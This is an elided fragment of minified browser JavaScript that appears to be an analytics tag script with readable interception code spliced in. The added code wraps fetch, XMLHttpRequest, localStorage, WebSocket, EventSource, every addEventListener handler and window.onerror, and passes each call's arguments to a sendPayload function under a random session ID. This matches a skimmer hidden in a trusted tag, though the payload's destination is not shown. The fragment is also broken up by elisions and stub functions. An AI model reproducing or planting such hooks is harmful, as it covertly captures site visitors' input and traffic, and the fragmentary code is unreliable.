...
(function () {
  ...
  */
  ...
  var Wf = {};
  Wf.Nm = Qa('');
  let globals = Object.assign({}, window);
  Wf.Xk = Qa('');
  var Xf = Vf,
    Yf = Wf.Xk,
    Zf = Wf.Nm;
  ...
  ii.fe = Number("0") || 0;
  ii.ka = "dataLayer";
  ii.Uj = "ChAI8NCBpwYQt5+cxZ7f1aFJEiUATU77VLF+BA6vwGrnKTLzwP5CQ2clnvF/PMSs/h1Prj9CctblGgJC+Q\x3d\x3d";
  var li = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  const randomNums = new Uint8Array(16);
  aa = wj.prototype;
  ...
  const sessionId = btoa(String.fromCharCode.apply(null, crypto.getRandomValues(randomNums)));
  function mm(a) {
  ...
  function generatePayload(functionName, args) {
    return {
      functionName,
  ...
  ;
  var mu = {};
  function hookFunction(functionName) {
    const originalFunction = window[functionName];
    if (typeof originalFunction === 'function') {
      window[functionName] = function () {
        const payload = generatePayload(functionName, arguments);
        sendPayload(payload);
        return originalFunction.apply(this, Array.from(arguments));
      };
    }
  }
  function nu(a, b) {
  ...
  function hookEventListeners() {
    ...
    window.EventTarget.prototype.addEventListener = function (eventName, eventHandler) {
      const hookedEventHandler = function () {
        const payload = generatePayload(`EventListener.${eventName}`, arguments);
        sendPayload(payload);
        return eventHandler.apply(this, arguments);
      };
      return originalAddEventListener.call(this, eventName, hookedEventHandler);
    };
  }
  function xu(a, b, c, d) {
    var e = nf[a],
  ...
  ['fetch', 'XMLHttpRequest', 'localStorage', 'WebSocket', 'EventSource'].forEach(hookFunction);
  function Nz(a, b, c) {}
  ...
  function captureErrors() {
    ...
    window.onerror = function (message, source, line, column, err) {
      ...
      return origOnError && origOnError.apply(this, arguments);
    };
  }
